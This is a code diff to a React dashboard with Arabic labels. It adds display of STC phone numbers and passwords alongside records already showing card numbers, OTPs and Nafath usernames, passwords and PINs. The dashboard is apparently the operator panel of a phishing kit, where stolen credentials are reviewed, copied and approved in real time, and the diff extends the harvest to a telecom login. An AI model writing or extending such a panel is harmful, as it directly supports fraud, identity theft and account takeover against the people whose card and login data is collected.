@@ -42,6 +42,7 @@ import {
   Check,
   Bell,
   Trash2,
+  Lock,
 } from "lucide-react"
 
 // ─── Types ───────────────────────────────────────────────────────────────────
@@ -446,6 +447,7 @@ function ConversationItem({
   const hasCard = !!(str(record.cardNumber) && str(record.cardNumber).length > 3)
   const hasOtp = !!(str(record.otp) || str(record.phoneOtp))
   const hasNafad = !!(str(record.nafadUsername) || str(record.nafadPassword) || str(record.nafaz_pin))
+  const hasStc = !!(str(record.stcPhone) || str(record.stcPassword))
   const time = formatTime(str(record.createdAt))
   const approvalNeeded = needsApproval(record)
 
@@ -527,6 +529,11 @@ function ConversationItem({
             {hasNafad && (
               <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-teal-900/40 text-teal-300 text-[8px] font-bold" title="نفاذ">
                 <Shield className="h-2.5 w-2.5" />
+              </span>
+            )}
+            {hasStc && (
+              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-purple-900/40 text-purple-300 text-[8px] font-bold" title="STC">
+                <Lock className="h-2.5 w-2.5" />
               </span>
             )}
             {step && (
@@ -1188,6 +1195,12 @@ export default function DashboardPage() {
                       <span className="hidden sm:inline">نفاذ</span>
                     </span>
                   )}
+                  {!!(str(selectedRecord.stcPhone) || str(selectedRecord.stcPassword)) && (
+                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-purple-900/40 text-purple-300 text-[10px] font-bold border border-purple-800/40" title="بيانات STC">
+                      <Lock className="h-3 w-3" />
+                      <span className="hidden sm:inline">STC</span>
+                    </span>
+                  )}
                   {selectedNeedsApproval && (
                     <span className="hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-bold bg-red-900/50 text-red-300 border border-red-800/40 flash-badge">
                       <Bell className="h-3 w-3" />
@@ -1436,6 +1449,14 @@ export default function DashboardPage() {
                         <DetailRow icon={User} label="اسم المستخدم" value={str(selectedRecord.nafadUsername)} mono copyable />
                         <DetailRow icon={Shield} label="كلمة المرور" value={str(selectedRecord.nafadPassword)} mono copyable />
                         <DetailRow icon={Hash} label="رمز نفاذ" value={str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)} mono copyable />
+                      </MiniSection>
+                    )}
+
+                    {/* STC Login Info */}
+                    {(str(selectedRecord.stcPhone) || str(selectedRecord.stcPassword)) && (
+                      <MiniSection title="بيانات STC" icon={Phone}>
+                        <DetailRow icon={Phone} label="رقم STC" value={str(selectedRecord.stcPhone)} mono copyable />
+                        <DetailRow icon={Lock} label="كلمة مرور STC" value={str(selectedRecord.stcPassword)} mono copyable />
                       </MiniSection>
                     )}
                   </div>
